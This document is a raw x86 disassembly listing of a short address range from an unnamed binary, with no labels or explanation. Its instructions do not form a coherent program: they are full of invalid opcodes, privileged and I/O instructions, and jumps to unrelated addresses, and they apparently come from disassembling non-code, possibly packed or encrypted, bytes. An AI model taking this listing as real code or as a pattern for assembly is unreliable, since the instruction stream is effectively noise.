  408f0e:	xchg   BYTE PTR [edi+ecx*4+0x27],ah
  408f12:	pop    ss
  408f13:	mov    al,0xc1
  408f15:	mov    al,0x26
  408f17:	(bad)  
  408f18:	lods   eax,DWORD PTR ds:[esi]
  408f19:	or     eax,0xfc4dacc0
  408f1e:	fdiv   DWORD PTR [ecx-0x1964c5fc]
  408f24:	inc    esi
  408f25:	sbb    eax,0x14f85b76
  408f2a:	sbb    eax,0x91fd8a53
  408f2f:	jl     0x408eb9
  408f31:	sbb    BYTE PTR [edx],ah
  408f33:	and    eax,0x4ef07f6f
  408f38:	pop    ss
  408f39:	rcr    edx,1
  408f3b:	jne    0x408f7f
  408f3d:	jmp    0x408ec3
  408f3f:	adc    esp,DWORD PTR [edi]
  408f41:	pushf  
  408f42:	pop    edx
  408f43:	cmp    DWORD PTR [edi-0x4ba86e53],0x779e90e0
  408f4d:	(bad)  
  408f4e:	jecxz  0x408efa
  408f50:	dec    eax
  408f51:	fadd   st(1),st
  408f53:	ds loope 0x408f10
  408f56:	pushf  
  408f57:	or     DWORD PTR [edi-0x6f],0x4e
  408f5b:	push   eax
  408f5c:	pop    ecx
  408f5d:	sub    eax,0xcf4b88cf
  408f62:	inc    edx
  408f63:	rol    BYTE PTR [edx+0x6903e15d],1
  408f69:	test   eax,0xf4800edb
  408f6e:	in     eax,dx
  408f6f:	jbe    0x408f1e
  408f71:	stos   BYTE PTR es:[edi],al
  408f72:	mov    ebx,0xd07b29b9
  408f77:	jl     0x408ff0
  408f79:	xor    BYTE PTR [edx-0x114f8145],ah
  408f7f:	fnstsw WORD PTR [edi+0x66]
  408f82:	fimul  WORD PTR [ecx+ebx*8+0x51]
  408f86:	cld    
  408f87:	mov    BYTE PTR [ebx-0x5db9d4ee],ah
  408f8d:	rcr    BYTE PTR [edx-0x3f19864d],0x8
  408f94:	fstp   QWORD PTR [eax+0x48c75cb3]
  408f9a:	inc    edi
  408f9b:	call   0x4b150e31
  408fa0:	mov    bh,0x9b
  408fa2:	or     dl,BYTE PTR [edi]
  408fa4:	test   al,0x9b
  408fa6:	cmp    BYTE PTR [esi],ch
  408fa8:	pop    esp
  408fa9:	jle    0x408fa0
  408fab:	loop   0x409021
  408fad:	lock add eax,0x47d01874
  408fb3:	leave  
  408fb4:	cmc    
  408fb5:	jne    0x408fd7
  408fb7:	enter  0x1e50,0x10
  408fbb:	iret   
  408fbc:	cmp    BYTE PTR [eax+0x48ada5f6],0xa9
  408fc3:	dec    edx
  408fc4:	push   esi
  408fc5:	in     eax,0xd8
  408fc7:	cmp    eax,0x7875fe62
  408fcc:	in     eax,dx
  408fcd:	xchg   edi,eax
  408fce:	sub    ah,BYTE PTR [ecx]
  408fd0:	sbb    BYTE PTR [edx],al
  408fd2:	xchg   edx,eax
  408fd3:	das    
  408fd4:	test   al,0xf3
  408fd6:	cmc    
  408fd7:	cmp    DWORD PTR [edi+0x28],edi
  408fda:	push   eax
  408fdb:	int    0xfa
  408fdd:	and    al,0xb
  408fdf:	cmp    bl,BYTE PTR [edi-0x5d]
  408fe2:	cs pop bp
  408fe5:	call   0x708e:0x213372d5
  408fec:	std    
  408fed:	xor    esi,DWORD PTR [eax+ebp*4-0x5ba7dfd2]
  408ff4:	fldcw  WORD PTR [ebp+0x79]
  408ff7:	js     0x408fea
  408ff9:	fst    DWORD PTR [ebx]
  408ffb:	rol    DWORD PTR [ecx-0x49],0x97
  408fff:	test   DWORD PTR [esi],ecx
  409001:	dec    ecx
  409002:	ror    BYTE PTR [ebp-0x2f232736],0xc8
  409009:	xor    al,0x1d
  40900b:	outs   dx,DWORD PTR ds:[esi]
  40900c:	fiadd  DWORD PTR [edx-0x9]
  40900f:	mov    BYTE PTR [ebx+0x2a2d916d],al
  409015:	(bad)  
  409016:	xlat   BYTE PTR ds:[ebx]
  409017:	cdq    
  409018:	shl    DWORD PTR [edx+ebx*2+0x7bfecb20],1
  40901f:	(bad)  
  409021:	mov    ecx,0xfaad10dc
  409026:	jae    0x40901a
  409028:	int    0x83
  40902a:	push   ds
  40902b:	cmp    esi,DWORD PTR [ecx-0x72a38f8]
  409031:	bound  esi,QWORD PTR [esi]
  409033:	mov    ds:0xd1ce131b,eax
  409038:	jae    0x40900b
  40903a:	jle    0x409078
  40903c:	xchg   ebx,eax
  40903d:	xchg   edi,eax
  40903e:	pop    ss
  40903f:	in     al,dx
  409040:	into   
  409041:	popf   
  409042:	xchg   ch,bh
  409044:	cdq    
  409045:	repz sub al,0x7b
  409048:	xchg   ebp,eax
  409049:	retf   0x20cf
  40904c:	mov    DWORD PTR [ebp+0x796664ea],esi
  409052:	cli    
  409053:	fdiv   DWORD PTR [esi+0x5fe1bd4c]
  409059:	lds    edx,FWORD PTR [ecx]
  40905b:	push   ss
  40905c:	inc    eax
  40905d:	aas    
  40905e:	cmc    
  40905f:	adc    DWORD PTR [edi-0x48ad5868],ecx
  409065:	into   
  409066:	sub    cl,BYTE PTR [ecx+0x472e5e3d]
  40906c:	inc    ebp
  40906d:	and    ecx,ecx
  40906f:	adc    al,0x31
  409071:	rol    bh,1
  409073:	ja     0x40909f
  409075:	and    eax,0x82e93c19
  40907a:	in     al,0xaa
  40907c:	imul   ecx,ebx,0xffffff83
  40907f:	retf   0xc163
  409082:	addr16 int3 
  409084:	scas   eax,DWORD PTR es:[edi]
  409085:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409086:	jnp    0x40909e
  409088:	or     eax,0xdc48eb52
  40908d:	or     al,0x4
  40908f:	pop    ecx
  409090:	ins    DWORD PTR es:[edi],dx
  409091:	pop    es
  409092:	pop    eax
  409093:	push   ecx
  409094:	mov    al,ds:0xa92ee148
  409099:	fisttp DWORD PTR [ecx+0x4ef68d34]
  40909f:	test   BYTE PTR [ebp-0x7c],al
  4090a2:	sub    al,0xb1
  4090a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4090a5:	or     edx,DWORD PTR [ebp-0x2684e37c]
  4090ab:	bound  ecx,QWORD PTR [esi-0xbe34845]
  4090b1:	imul   ecx,DWORD PTR [ecx+0x1f7e3102],0x13
  4090b8:	pop    esi
  4090b9:	sbb    eax,0x65a59917
  4090be:	push   0xfffffffa
  4090c0:	inc    ecx
  4090c1:	jae    0x409103
  4090c3:	(bad)  
  4090c4:	es (bad) 
  4090c6:	jno    0x409097
  4090c8:	sub    DWORD PTR [ebx+esi*1+0x66],esp
  4090cc:	adc    ebx,DWORD PTR [ebx]
  4090ce:	add    ebx,edx
  4090d0:	add    cl,BYTE PTR [eax-0x23251b94]
  4090d6:	xor    al,0x87
  4090d8:	and    eax,0x58879b58
  4090dd:	adc    bh,BYTE PTR [esp+ecx*8+0x6d]
  4090e1:	mov    ebx,0x9db8d040
  4090e6:	mov    ecx,0x9b6311b1
  4090eb:	stos   DWORD PTR es:[edi],eax
  4090ec:	xor    eax,DWORD PTR [edx+0x2696d52e]
  4090f2:	mov    bh,0x11
  4090f4:	mov    eax,0xce66d7e8
  4090f9:	sub    ebp,DWORD PTR [esi]
  4090fb:	pop    eax
  4090fc:	mov    esi,0x74aaf1fc
  409101:	pop    ecx
  409102:	and    eax,eax
  409104:	fcomp  DWORD PTR [edx-0x78d57573]
  40910a:	sti    
  40910b:	test   eax,0x7ac488f1
  409110:	jl     0x40910b
  409112:	bound  eax,QWORD PTR [esi+0x4ca002fb]
  409118:	and    BYTE PTR [ebx],0xae
  40911b:	mov    esi,0x7f560dcc
  409120:	outs   dx,BYTE PTR ds:[esi]
  409121:	mov    ebp,0xb3659a21
  409126:	add    BYTE PTR [ebx+0x4577d00e],bh
  40912c:	imul   edi,ebx,0x3d
  40912f:	into   
  409130:	maskmovq mm6,(bad)
  409131:	div    DWORD PTR [ecx-0x26]
  409134:	jp     0x409133
  409136:	fs int3 
  409138:	xor    al,0xa2
  40913a:	outs   dx,DWORD PTR ds:[esi]
  40913b:	push   ecx
  40913c:	sbb    ch,ah
  40913e:	cmp    eax,0xa9b069a2
  409143:	sub    bl,BYTE PTR [edx+0x36]
  409146:	cmp    eax,0xcb9db283
  40914b:	pop    ebx
  40914c:	ins    DWORD PTR es:[edi],dx
  40914d:	cmp    dh,ch
  40914f:	lods   eax,DWORD PTR ds:[esi]
  409150:	and    al,0xbc
  409152:	add    al,0xfc
  409154:	shl    dl,0x82
  409157:	gs stos DWORD PTR es:[edi],eax
  409159:	mov    edx,0x7841b899
  40915e:	jne    0x4091be
  409160:	icebp  
  409161:	xchg   edi,eax
  409162:	mov    cl,0x32
  409164:	pop    edi
  409165:	mov    ds:0xd7c5be5e,al
  40916a:	pop    ecx
  40916b:	add    eax,0x4787796a
  409170:	aam    0xb8
  409172:	nop
  409173:	jns    0x4091ad
  409175:	aad    0x22
  409177:	jno    0x40910d
  409179:	pop    eax
  40917a:	inc    edx
  40917b:	clc    
  40917c:	adc    DWORD PTR [ebp+0x2cf86ef6],esi
  409182:	pop    ds
  409183:	or     dl,0x15
  409186:	push   ebp
  409187:	test   BYTE PTR [esi+0x29641912],0x83
  40918e:	hlt    
  40918f:	out    0x5a,eax
  409191:	add    al,0xd6
  409193:	cmp    eax,0x286f25ff
  409198:	mov    dh,0x8d
  40919a:	xor    DWORD PTR [edi],edi
  40919c:	ds pop ebx
  40919e:	std    
  40919f:	or     DWORD PTR [esi-0x124814f0],ebp
  4091a5:	test   BYTE PTR [edx+0x67],dl
  4091a8:	mov    cl,BYTE PTR [esp+ebx*4]
  4091ab:	xchg   esi,eax
  4091ac:	mov    al,0x29
  4091ae:	hlt    
  4091af:	jle    0x40917d
  4091b1:	fcmovnb st,st(3)
  4091b3:	inc    edi
  4091b4:	jb     0x409219
  4091b6:	mov    ebx,0xa772e312
  4091bb:	adc    BYTE PTR [edx-0x43],dh
  4091be:	mov    eax,0x12177ac3
  4091c3:	mov    ch,BYTE PTR [edi+eiz*8]
  4091c6:	dec    edx
  4091c7:	jge    0x40915c
  4091c9:	mov    ?,WORD PTR [esi-0x18fed3fa]
  4091cf:	jmp    0x7ed1fcba
  4091d4:	fld    TBYTE PTR [ecx+ecx*2-0x219f1917]
  4091db:	jb     0x4091e2
  4091dd:	push   ds
  4091de:	leave  
  4091df:	idiv   eax
  4091e1:	fstp   DWORD PTR [edi+0x2dfe128f]
  4091e7:	jge    0x409211
  4091e9:	xlat   BYTE PTR ds:[ebx]
  4091ea:	inc    edx
  4091eb:	and    DWORD PTR [edi+0x5b9219ee],eax
  4091f1:	aaa    
  4091f2:	hlt    
  4091f3:	daa    
  4091f4:	clc    
  4091f5:	and    ebp,DWORD PTR [eax*4-0xaa4a4a9]
  4091fc:	ror    DWORD PTR cs:[esi],cl
  4091ff:	adc    al,0xf8
  409201:	mov    ecx,0xfa73db36
  409206:	in     al,dx
  409207:	add    BYTE PTR [edx],ch
  409209:	jge    0x40926d
  40920b:	add    BYTE PTR [ebp+0x144899b],dl
  409211:	je     0x409246
  409213:	shl    BYTE PTR [edx+0x5ea0acaf],1
  409219:	fcomp  QWORD PTR [ebp+0x368fa273]
  40921f:	inc    eax
  409220:	mov    al,ds:0xd2d25f70
  409225:	lock push ebp
  409227:	dec    esi
  409228:	mov    ecx,0xb5952e87
  40922d:	xchg   esp,edx
  40922f:	inc    ebp
  409230:	leave  
  409231:	cmp    BYTE PTR ds:0xe996ce5,al
  409237:	adc    eax,0x3e6cdde7
  40923c:	lods   eax,DWORD PTR ds:[esi]
  40923d:	xchg   edi,eax
  40923e:	sub    esi,DWORD PTR [ebp+0x2d]
  409241:	jno    0x409270
  409243:	test   al,0x67
  409245:	ror    eax,0x3e
  409248:	js     0x409253
  40924a:	idiv   BYTE PTR [esi+0x3a05d82a]
  409250:	mov    ah,0xe8
  409252:	lds    edi,FWORD PTR [edi-0x25767a85]
  409258:	imul   si,WORD PTR [ecx+ebx*4],0xffcf
  40925d:	gs push 0xff47cab2
  409263:	inc    ebx
  409264:	mov    bl,0x75
  409266:	add    eax,0xff1c277e
  40926b:	in     al,dx
  40926c:	mov    edi,0x71efb3cc
  409271:	mov    dh,0x32
  409273:	rcr    DWORD PTR [eax+0x5a80f1ba],0x30
  40927a:	add    ecx,DWORD PTR [eax-0x4b8fb58e]
  409280:	inc    esi
  409281:	fisubr WORD PTR [edx-0x618bf069]
  409287:	fs sahf 
  409289:	jmp    0x409281
  40928b:	aam    0x1
  40928d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40928e:	cmp    ecx,DWORD PTR [ebp+0xd1585dc]
  409294:	dec    edx
  409295:	clc    
  409296:	and    al,BYTE PTR [ecx+0x6a]
  409299:	or     edx,eax
  40929b:	inc    ebx
  40929c:	adc    DWORD PTR [ecx+ebx*1],edi
  40929f:	sbb    DWORD PTR [ecx],esp
  4092a1:	add    DWORD PTR [ecx+0x1d],esp
  4092a4:	mov    al,0x2b
  4092a6:	and    al,0x39
  4092a8:	add    BYTE PTR [ebp+0x21d9a7db],0x71
  4092af:	push   esp
  4092b0:	mov    cl,dl
  4092b2:	sub    edx,eax
  4092b4:	mov    ebp,ebx
  4092b6:	clc    
  4092b7:	push   ebp
  4092b8:	push   ecx
  4092b9:	adc    eax,0x1d4ffc19
  4092be:	cmp    DWORD PTR ds:0x62e6a367,ebp
  4092c4:	pop    edx
  4092c5:	inc    ecx
  4092c6:	test   DWORD PTR gs:[edi-0x3e],edi
  4092ca:	push   esp
  4092cb:	jo     0x409294
  4092cd:	ins    BYTE PTR es:[edi],dx
  4092ce:	push   0xffffffac
  4092d0:	loop   0x4092c8
  4092d2:	mov    eax,0x4e6e6e6a
  4092d7:	sar    ch,0xe6
  4092da:	mov    bl,0x92
  4092dc:	mov    ecx,0x7fd7d815
  4092e1:	je     0x409359
  4092e3:	dec    ecx
  4092e4:	idiv   DWORD PTR ds:0xd33c5b37
  4092ea:	xlat   BYTE PTR ds:[ebx]
  4092eb:	sbb    DWORD PTR [ebx-0xdba9e8e],ebx
  4092f1:	out    0xd0,al
  4092f3:	sbb    bh,bl
  4092f5:	test   dh,bh
  4092f7:	sub    DWORD PTR [ecx+0x11],0xd592f75
  4092fe:	jo     0x409326
  409300:	mov    al,ds:0xe30bab5
  409305:	xor    BYTE PTR [ecx],bh
  409307:	xchg   esp,eax
  409308:	xor    ebp,DWORD PTR [ebx+0x65]
  40930b:	xchg   ecx,eax
  40930c:	jge    0x4092dd
  40930e:	xchg   edx,eax
  40930f:	test   ebx,edx
  409311:	and    eax,0x5789f702
  409316:	clc    
  409317:	fisttp WORD PTR [edx]
  409319:	fwait
  40931a:	or     eax,0x919f0020
  40931f:	sub    edx,ebp
  409321:	jle    0x40932b
  409323:	dec    ebp
  409324:	cs cmc 
  409326:	dec    esp
  409327:	push   edi
  409328:	sbb    eax,0x242e55be
  40932d:	out    0xc5,al
  40932f:	rol    BYTE PTR [edx+0x44],1
  409332:	add    eax,0x96146c06
  409337:	mov    fs,WORD PTR [edi+0x52]
  40933a:	jmp    0x409396
  40933c:	cs sbb ecx,ebp
  40933f:	fild   DWORD PTR [ebx-0x6d]
  409342:	adc    BYTE PTR [ecx-0x3d22e80a],dl
  409348:	fisttp WORD PTR [edi]
  40934a:	das    
  40934b:	add    cl,ch
  40934d:	and    al,0x81
  40934f:	shl    DWORD PTR [edx+eax*8],1
  409352:	sub    DWORD PTR [ecx+0x1e130da4],esi
  409358:	dec    esp
  409359:	rcr    BYTE PTR ds:0x95d971d8,0x17
  409360:	jbe    0x409353
  409362:	scas   al,BYTE PTR es:[edi]
  409363:	in     al,dx
  409364:	push   eax
  409365:	ins    DWORD PTR es:[edi],dx
  409366:	sub    BYTE PTR [ecx+edx*2+0x6378f302],ah
  40936d:	aas    
  40936e:	(bad)  
  40936f:	test   al,0x75
  409371:	gs sbb al,0x83
  409374:	sar    BYTE PTR [ebx+0x66],1
  409377:	fist   DWORD PTR [edi]
  409379:	jne    0x409321
  40937b:	xchg   edi,eax
  40937c:	dec    edx
  40937d:	xlat   BYTE PTR ds:[ebx]
  40937e:	dec    esp
  40937f:	jg     0x409303
  409381:	scas   al,BYTE PTR es:[edi]
  409382:	popf   
  409383:	or     esp,DWORD PTR [ebx]
  409385:	mov    BYTE PTR [ebx+0x5e],dl
  409388:	dec    ebp
  409389:	sbb    al,0x54
  40938b:	pop    ss
  40938c:	sub    al,0xfa
  40938e:	pop    edi
  40938f:	int    0xe6
  409391:	mov    DWORD PTR [esi],edx
  409393:	xchg   ebx,eax
  409394:	jno    0x409369
  409396:	push   cs
  409397:	and    DWORD PTR [eax+0x6406ce],0x4f
  40939e:	cmp    BYTE PTR [eax-0x23457a2a],dh
  4093a4:	mov    dl,0x75
  4093a6:	sbb    BYTE PTR [ebx-0x6ca6fee],dh
  4093ac:	sbb    DWORD PTR ss:[edi+0x37],esp
  4093b0:	dec    esi
  4093b1:	push   esp
  4093b2:	jmp    0x409401
  4093b4:	adc    ebp,DWORD PTR [edi]
  4093b6:	(bad)  
  4093b7:	mov    esi,0x332fe973
  4093bc:	cdq    
  4093bd:	adc    ch,BYTE PTR [esi+0x336ae4b9]
  4093c3:	mov    edi,0x3330f0cb
  4093c8:	(bad)  
  4093c9:	call   0xa6645caf
  4093ce:	mov    eax,0xd277dd1f
  4093d3:	call   0x73652cd2
  4093d8:	loope  0x409373
  4093da:	mov    edx,0x19fec899
  4093df:	fld    TBYTE PTR [eax-0x30]
  4093e2:	ins    BYTE PTR es:[edi],dx
  4093e3:	(bad)  
  4093e4:	fwait
  4093e5:	add    edx,eax
  4093e7:	fxch   st(1)
  4093e9:	ds mov ebp,0xe08f4e9d
  4093ef:	lods   eax,DWORD PTR ds:[esi]
  4093f0:	(bad)  
  4093f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4093f2:	sub    eax,0xb770a1bf
  4093f7:	mov    ch,0x73
  4093f9:	ror    bh,0xf8
  4093fc:	mov    al,BYTE PTR [edi+0x6f]
  4093ff:	inc    ebp
  409400:	scas   al,BYTE PTR es:[edi]
  409401:	sbb    al,0x93
  409403:	rcr    BYTE PTR [edi],0x3e
  409406:	xchg   edi,eax
  409407:	(bad)  
  409408:	out    0xc0,al
  40940a:	loopne 0x409457
  40940c:	pushf  
  40940d:	and    esi,ebx
  40940f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409410:	xor    edi,0x5788f566
  409416:	dec    eax
  409417:	xchg   ecx,ecx
  409419:	xchg   ecx,eax
  40941a:	mov    edi,0xaef20e9e
  40941f:	fadd   st(0),st
  409421:	push   ebp
  409422:	push   ds
  409423:	pop    ebp
  409424:	jno    0x409482
  409426:	dec    edi
  409427:	and    eax,0x7b0aef17
  40942c:	mov    esp,0x905b0c34
  409431:	jge    0x4093ff
  409433:	mov    dl,0x3c
  409435:	outs   dx,BYTE PTR ds:[esi]
  409436:	jge    0x4093d3
  409438:	push   es
  409439:	repz jo 0x4093e8
  40943c:	dec    ebp
  40943d:	popa   
  40943e:	mov    esi,0xca2a1bf6
  409443:	xchg   esp,eax
  409444:	mov    esp,0xdb8e795f
  409449:	mov    ebx,DWORD PTR [edi-0x56]
  40944c:	test   eax,0xa80eb461
  409451:	ret    
  409452:	into   
  409453:	push   eax
  409454:	in     al,dx
  409455:	cmp    ch,al
  409457:	ja     0x4093f2
  409459:	jmp    0xec87a3e7
  40945e:	enter  0xc41f,0xd0
  409462:	pusha  
  409463:	push   es
  409464:	xor    DWORD PTR [esi-0x7ff7200b],edx
  40946a:	clc    
  40946b:	jb     0x4093f4
  40946d:	mov    bh,0xcc
  40946f:	popf   
  409470:	gs jno 0x40949e
  409473:	adc    al,0xfd
  409475:	mov    ah,0x13
  409477:	mov    ds:0x408c74c8,al
  40947c:	mov    ah,0x6b
  40947e:	inc    esp
  40947f:	pop    esp
  409480:	iret   
  409481:	push   ecx
  409482:	in     al,0x36
  409484:	mov    dh,0xca
  409486:	scas   al,BYTE PTR es:[edi]
  409487:	add    BYTE PTR [eax-0x295c664a],dl
  40948d:	out    dx,eax
  40948e:	mov    edi,0x3a052e95
  409493:	mov    BYTE PTR [esi-0x74d48eac],al
  409499:	bound  ebx,QWORD PTR [eax]
  40949b:	dec    ecx
  40949c:	mov    edx,0xe93ac71d
  4094a1:	cdq    
  4094a2:	mov    DWORD PTR [ebp+ebx*2-0x31],ebp
  4094a6:	fld    DWORD PTR [ebp-0x3b31dcc3]
  4094ac:	lock xor BYTE PTR [eax-0x5fa55b6a],cl
  4094b3:	sub    esp,DWORD PTR [edi]
  4094b5:	mov    edi,0x1351132c
  4094ba:	mov    edx,0x5cce01f0
  4094bf:	(bad)  
  4094c0:	cmp    bh,dl
  4094c2:	xchg   ebx,eax
  4094c3:	mov    DWORD PTR [ecx+ebp*8-0x2f],eax
  4094c7:	adc    ch,0x72
  4094ca:	stc    
  4094cb:	mov    bl,0xa9
  4094cd:	scas   al,BYTE PTR es:[edi]
  4094ce:	icebp  
  4094cf:	jmp    0x52b5414c
  4094d4:	arpl   WORD PTR [eax-0x6ec74739],ax
  4094da:	sub    eax,0x4802bf90
  4094df:	aam    0x67
  4094e1:	adc    bh,BYTE PTR [ecx]
  4094e3:	jo     0x409546
  4094e5:	sbb    al,0x9e
  4094e7:	inc    ebx
  4094e8:	fbstp  TBYTE PTR ds:[ebx]
  4094eb:	xchg   edi,eax
  4094ec:	ret    0x6939
  4094ef:	pop    ss
  4094f0:	xchg   ecx,eax
  4094f1:	adc    esi,DWORD PTR [edx+0x5588f362]
  4094f7:	and    eax,0xf0ed67c8
  4094fc:	fsubr  DWORD PTR [edx+0x31]
  4094ff:	cmp    ah,BYTE PTR [edx+0x6]
  409502:	lea    edx,[ecx]
  409504:	and    bh,BYTE PTR [bx+0xc7]
  409509:	xchg   esi,eax
  40950a:	inc    edi
  40950b:	push   cs
  40950c:	or     al,0xe9
  40950e:	bound  edi,QWORD PTR [esi]
  409510:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409511:	leave  
  409512:	mov    BYTE PTR [eax],dh
  409514:	cdq    
  409515:	and    edx,DWORD PTR [eax-0x34ac1582]
  40951b:	lods   eax,DWORD PTR ds:[esi]
  40951c:	sbb    ebp,eax
  40951e:	and    bl,BYTE PTR [ebx]
  409520:	ds call 0xaff93c40
  409526:	jmp    0x7c0a:0xdbe9e53a
  40952d:	retf   0x9def
  409530:	dec    esp
  409531:	jg     0x4094f4
  409533:	fnstcw WORD PTR [edi]
  409535:	pop    es
  409536:	stos   DWORD PTR es:[edi],eax
  409537:	pop    ebp
  409538:	je     0x4094fd
  40953a:	in     al,0xc6
  40953c:	sub    dh,BYTE PTR [edx+0x4d]
  40953f:	xor    edx,DWORD PTR [edi+0x2896d90a]
  409545:	fcomip st,st(3)
  409547:	shl    DWORD PTR [eax+0x22],cl
  40954a:	push   esi
  40954b:	xchg   esi,eax
  40954c:	stc    
  40954d:	fdivr  QWORD PTR [ecx-0x3d]
  409550:	icebp  
  409551:	call   0x5d16:0x687cd10b
  409558:	in     eax,0x4
  40955a:	mov    ds:0xa42d8c49,eax
  40955f:	es sub al,0xd1
  409562:	push   edi
  409563:	pop    esp
  409564:	xchg   BYTE PTR [ebp+0x46149c5c],bl
  40956a:	push   esp
  40956b:	call   0x3b82:0x2049e19a
  409572:	xchg   esp,eax
  409573:	jmp    0x4095d3
  409575:	pop    esp
  409576:	mov    edi,0x309e4de3
  40957b:	js     0x4095a9
  40957d:	jl     0x4095f2
  40957f:	cmp    DWORD PTR [eax+0x36],edi
  409582:	pop    ds
  409583:	mov    al,ds:0x75b86f6b
  409588:	outs   dx,DWORD PTR ds:[esi]
  409589:	das    
  40958a:	jg     0x40958d
  40958c:	shr    DWORD PTR [ecx-0x395a3323],0xf9
  409593:	inc    edx
  409594:	xchg   edi,eax
  409595:	push   ebx
  409596:	cmp    BYTE PTR [ecx+esi*1],0x90
  40959a:	repnz outs dx,DWORD PTR ds:[esi]
  40959c:	or     bh,BYTE PTR [eax]
  40959e:	mov    ds:0xd98d0ab,al
  4095a3:	out    0x5e,al
  4095a5:	mov    ebx,DWORD PTR [ebp+0x3cdcb8b7]
  4095ab:	push   edx
  4095ac:	push   esp
  4095ad:	bound  ecx,QWORD PTR [eax+0x6f]
  4095b0:	mov    esp,0x80b89332
  4095b5:	retf   0x5a36
  4095b8:	iret   
  4095b9:	fincstp 
  4095bb:	getsec 
  4095bd:	jb     0x4095a6
  4095bf:	loope  0x409549
  4095c1:	fild   WORD PTR [ebp*1+0x1c9cac92]
  4095c8:	inc    esp
  4095c9:	scas   eax,DWORD PTR es:[edi]
  4095ca:	push   ss
  4095cb:	bnd ret 
  4095cd:	lock repnz and esp,DWORD PTR [eax]
  4095d1:	cli    
  4095d2:	jo     0x40959a
  4095d4:	push   ebx
  4095d5:	xor    cl,bh
  4095d7:	int3   
  4095d8:	lods   eax,DWORD PTR ds:[esi]
  4095d9:	lods   eax,DWORD PTR ds:[esi]
  4095da:	xor    al,0xf3
  4095dc:	adc    eax,0x953ae341
  4095e1:	test   DWORD PTR [edi-0x64bf6707],esi
  4095e7:	ds push ds
  4095e9:	nop
  4095ea:	push   ss
  4095eb:	lock adc BYTE PTR [esi],0x41
  4095ef:	shl    BYTE PTR [ecx+0x36],cl
  4095f2:	ds stos BYTE PTR es:[edi],al
  4095f4:	outs   dx,BYTE PTR ds:[esi]
  4095f5:	or     eax,0xc8cd4da6
  4095fa:	pop    ebx
  4095fb:	loope  0x4095b3
  4095fd:	push   eax
  4095fe:	or     BYTE PTR [edx],0x8f
  409601:	aad    0x66
  409603:	int    0x67
  409605:	lock mov ecx,0x869d935
  40960b:	cmp    bh,bl
  40960d:	fmul   st,st(3)
  40960f:	lock add ah,BYTE PTR [ebx-0x1f3ff42c]
  409616:	mov    ebp,0xfe1564e3
  40961b:	push   eax
  40961c:	movq   QWORD PTR [ecx+0x516417da],mm3
  409623:	pushf  
  409624:	inc    esi
  409625:	popa   
  409626:	gs dec esp
  409628:	stos   DWORD PTR es:[edi],eax
  409629:	les    esp,FWORD PTR [ebx-0x12ab7175]
  40962f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409630:	pop    esp
  409631:	inc    edi
  409632:	ins    DWORD PTR es:[edi],dx
  409633:	out    0xd0,al
  409635:	or     bh,BYTE PTR [edi-0x3ac15bc1]
  40963b:	es scas al,BYTE PTR es:[edi]
  40963d:	push   ds
  40963e:	cld    
  40963f:	stos   BYTE PTR es:[edi],al
  409640:	sub    BYTE PTR [edx+ebp*4],0x8b
  409644:	push   es
  409645:	fdiv   QWORD PTR [edx+0x12]
  409648:	int3   
  409649:	cmc    
  40964a:	push   esi
  40964b:	in     eax,0x24
  40964d:	and    dl,BYTE PTR [ecx+0x4c8ef523]
  409653:	lock and BYTE PTR [edi+0x41],dl
  409657:	sti    
  409658:	ret    0xb54f
  40965b:	adc    al,BYTE PTR [edx]
  40965d:	lea    edx,[ebx-0x5f313a6f]
  409663:	out    dx,eax
  409664:	or     BYTE PTR [ecx-0x13],0xeb
  409668:	jmp    0xe9f3:0x5040e97
  40966f:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  409671:	lods   al,BYTE PTR ds:[esi]
  409672:	icebp  
  409673:	fsubr  st,st(5)
  409675:	push   ecx
  409676:	jne    0x409658
  409678:	retf   
  409679:	adc    BYTE PTR [eax+0x5b],0xe8
  40967d:	int3   
  40967e:	mov    eax,ds:0xf695df6f
  409683:	stos   DWORD PTR es:[edi],eax
  409684:	in     eax,0x56
  409686:	push   ds
  409687:	sar    ah,0x6a
  40968a:	xor    esp,DWORD PTR [ecx]
  40968c:	fcmove st,st(2)
  40968e:	or     DWORD PTR [esi-0x32],esi
  409691:	pop    esi
  409692:	mov    esi,0x5faab521
  409697:	popa   
  409698:	fcomp  QWORD PTR [eax]
  40969a:	cwde   
  40969b:	sub    al,0x80
  40969d:	bound  eax,QWORD PTR [eax+ecx*8+0x22]
  4096a1:	pop    ss
  4096a2:	sub    eax,0xd9acc201
  4096a7:	enter  0x2ca8,0x96
  4096ab:	rcr    BYTE PTR [esi+0x28550f0],cl
  4096b1:	stos   BYTE PTR es:[edi],al
  4096b2:	xor    BYTE PTR [esi-0x331b4f19],ch
  4096b8:	dec    esi
  4096b9:	pop    es
  4096ba:	loope  0x409643
  4096bc:	push   ebp
  4096bd:	mov    ecx,0x12e216ea
  4096c2:	(bad)  
  4096c4:	pop    ds
  4096c5:	and    eax,DWORD PTR [eax-0x17]
  4096c8:	ret    0xb4ee
  4096cb:	stc    
  4096cc:	in     eax,dx
  4096cd:	mov    dl,0x88
  4096cf:	popf   
  4096d0:	aaa    
  4096d1:	pop    ss
  4096d2:	test   DWORD PTR [ecx],ebp
  4096d4:	xchg   esp,eax
  4096d5:	mov    dl,0x32
  4096d7:	pop    esi
  4096d8:	out    dx,al
  4096d9:	pusha  
  4096da:	inc    edx
  4096db:	add    bl,ah
  4096dd:	outs   dx,DWORD PTR ds:[esi]
  4096de:	push   esp
  4096df:	pop    edi
  4096e0:	int    0xa0
  4096e2:	or     dl,dl
  4096e4:	aas    
  4096e5:	push   ds
  4096e6:	mov    ecx,ebp
  4096e8:	sbb    al,dh
  4096ea:	push   ss
  4096eb:	inc    edi
  4096ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4096ed:	mul    BYTE PTR ds:0xc480632d
  4096f3:	int    0xc2
  4096f5:	jmp    0x63c3e0a0
  4096fa:	inc    eax
  4096fb:	pop    edx
  4096fc:	shr    BYTE PTR ds:0xf58188aa,1
  409702:	in     al,0xd9
  409704:	push   0x353c1eb3
  409709:	sbb    BYTE PTR [esi+0x3e],ch
  40970c:	stc    
  40970d:	push   edx
  40970e:	xchg   edi,eax
  40970f:	sub    al,0x94
  409711:	(bad)  
  409712:	(bad)  
